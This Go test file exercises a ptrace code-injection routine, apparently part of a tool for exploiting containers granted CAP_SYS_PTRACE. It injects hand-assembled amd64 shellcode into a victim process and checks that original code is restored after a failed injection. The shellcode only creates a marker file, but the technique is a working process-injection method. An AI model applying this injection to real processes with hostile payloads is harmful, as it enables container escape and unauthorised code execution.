//go:build linux && amd64

package ptraceinject

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

// markerFile is created by the injected child's shellcode (creat syscall).
// Since the victim is started from within the test process, it shares the
// container's mount namespace, so the file is visible to the test.
const markerFile = "/tmp/pi"

// startVictim re-execs the test binary in "victim mode" (see TestMain in
// ptraceinject_test.go): a pure user-space spin loop with GOMAXPROCS=1 and GC
// disabled. This guarantees RIP is always a user instruction when a tracer
// attaches, making ptrace code-injection deterministic. It waits for a
// readiness file so the victim has fully entered the loop before returning.
func startVictim(t *testing.T) *exec.Cmd {
	exe, err := os.Executable()
	if err != nil {
		t.Fatalf("os.Executable: %v", err)
	}
	cmd := exec.Command(exe)
	cmd.Env = append(os.Environ(), "PTRACEINJECT_VICTIM=1")
	if err := cmd.Start(); err != nil {
		t.Fatalf("failed to start victim: %v", err)
	}
	// Wait for the victim to signal it has entered the spin loop.
	readyFile := fmt.Sprintf("/tmp/ptraceinject_victim_ready_%d", cmd.Process.Pid)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(readyFile); err == nil {
			break
		}
		time.Sleep(time.Millisecond)
	}
	os.Remove(readyFile)
	return cmd
}

// forkCreatExit is amd64 shellcode that follows the Inject convention:
//
//	fork(); if (child) { creat("/tmp/pi", 07); exit(0); } else { int3; }
//
// The parent traps on int3 so Inject can restore it; the child creates a
// marker file and exits, which the test detects.
var forkCreatExit = []byte{
	// fork()
	0x6a, 0x39, // push 57
	0x58,       // pop rax
	0x0f, 0x05, // syscall
	0x48, 0x85, 0xc0, // test rax, rax
	0x74, 0x01, // je +1 (jump over int3 into child code)
	0xcc, // int3 (parent traps here)

	// --- child: creat("/tmp/pi", 07) ---
	0x48, 0xb8, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x70, 0x69, 0x00, // mov rax, "/tmp/pi\0"
	0x50,             // push rax
	0x48, 0x89, 0xe7, // mov rdi, rsp        ; rdi = path
	0x6a, 0x55, // push 85             ; SYS_creat (amd64)
	0x58,       // pop rax
	0x6a, 0x07, // push 7              ; mode = 07
	0x5e,       // pop rsi
	0x0f, 0x05, // syscall

	// exit(0)
	0x6a, 0x3c, // push 60             ; SYS_exit
	0x58,             // pop rax
	0x48, 0x31, 0xff, // xor rdi, rdi
	0x0f, 0x05, // syscall
}

// TestE2E_Inject verifies the full injection flow: a victim process is
// started, fork+creat+exit shellcode is injected, the forked child creates a
// marker file, and the victim continues running unaffected.
//
// This test requires CAP_SYS_PTRACE (and a permissive ptrace_scope). It is
// gated on TEST_ENV=exploitable, matching the e2e container setup used for
// vul/caps/sys_ptrace/pid_host.
func TestE2E_Inject(t *testing.T) {
	if os.Getenv("TEST_ENV") != "exploitable" {
		t.Skipf("Skipping e2e test; set TEST_ENV=exploitable (requires cap_sys_ptrace)")
	}

	// Clean up any stale marker from a previous run.
	os.Remove(markerFile)

	// Start a deterministic victim: a pure user-space spin loop (re-exec'd
	// test binary via startVictim). RIP is always a user instruction, so
	// PTRACE_CONT immediately executes the injected shellcode.
	victim := startVictim(t)
	victimPid := victim.Process.Pid
	t.Logf("victim pid: %d", victimPid)

	defer func() {
		victim.Process.Signal(syscall.SIGKILL)
		victim.Wait()
		os.Remove(markerFile)
	}()

	// Inject the fork+creat+exit shellcode.
	if err := Inject(victimPid, forkCreatExit); err != nil {
		t.Fatalf("Inject failed: %v", err)
	}

	// Wait for the marker file to appear (the forked child creates it).
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(markerFile); err == nil {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	_, err := os.Stat(markerFile)
	assert.NoError(t, err, "marker file %s not created by injected child", markerFile)

	// Verify the victim is still alive and running normally.
	err = victim.Process.Signal(syscall.Signal(0))
	assert.NoError(t, err, "victim process should still be alive after injection")
}

// TestE2E_Inject_ErrorRestoresTarget is the regression test for mid-injection
// error restoration (review issue #1). It injects a non-conforming shellcode
// (bare int3, no fork) that forces Inject to fail at the PTRACE_EVENT_FORK
// check. The target must be restored to its original code so it survives;
// without error-path restoration the victim resumes with 0xcc at RIP,
// re-executes int3 with no tracer attached, and is killed by the default
// SIGTRAP action.
func TestE2E_Inject_ErrorRestoresTarget(t *testing.T) {
	if os.Getenv("TEST_ENV") != "exploitable" {
		t.Skipf("Skipping e2e test; set TEST_ENV=exploitable (requires cap_sys_ptrace)")
	}

	victim := startVictim(t)
	victimPid := victim.Process.Pid
	t.Logf("victim pid: %d", victimPid)

	defer func() {
		victim.Process.Signal(syscall.SIGKILL)
		victim.Wait()
	}()

	// Two int3 bytes, no fork — violates the Inject shellcode convention, so
	// Inject must fail at the PTRACE_EVENT_FORK check and return an error.
	//
	// Why two bytes, not one: after the first int3 traps, RIP advances to the
	// second injected 0xcc. On the (unfixed) error path, Inject detaches
	// without restoring the original code, so the victim resumes by executing
	// the second 0xcc — an int3 with no tracer attached — and is killed by the
	// default SIGTRAP action. With error-path restoration, the original code is
	// poked back before detach, so the victim survives. A single 0xcc would
	// not catch the bug: RIP would advance past it into original code
	// regardless of restoration.
	err := Inject(victimPid, []byte{0xcc, 0xcc})
	assert.Error(t, err, "Inject should fail for non-conforming shellcode")

	// Give the detached victim time to re-execute the byte at RIP. If the code
	// was not restored, RIP still holds 0xcc → int3 → default SIGTRAP → death.
	time.Sleep(300 * time.Millisecond)

	// The victim must still be alive AND running (not a zombie). Signal(0)
	// succeeds on a zombie (unreaped child), so check /proc/<pid>/status
	// State field directly: "R" = running, "Z" = zombie, absent = gone.
	// Inject's error path must have restored the original code before
	// detaching, so the victim continues its busy loop.
	state := procState(victimPid)
	assert.Contains(t, []string{"R", "S", "D"}, state,
		"victim should still be running after a failed Inject (error path must restore original code); got state %q", state)
}

// procState reads the State field from /proc/<pid>/status. Returns "gone" if
// the process no longer exists (reaped/exited), or the single-letter state
// code (R=running, S=sleeping, Z=zombie, …) otherwise.
func procState(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return "gone"
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "State:") {
			fields := strings.Fields(strings.TrimPrefix(line, "State:"))
			if len(fields) > 0 {
				return fields[0]
			}
		}
	}
	return "?"
}
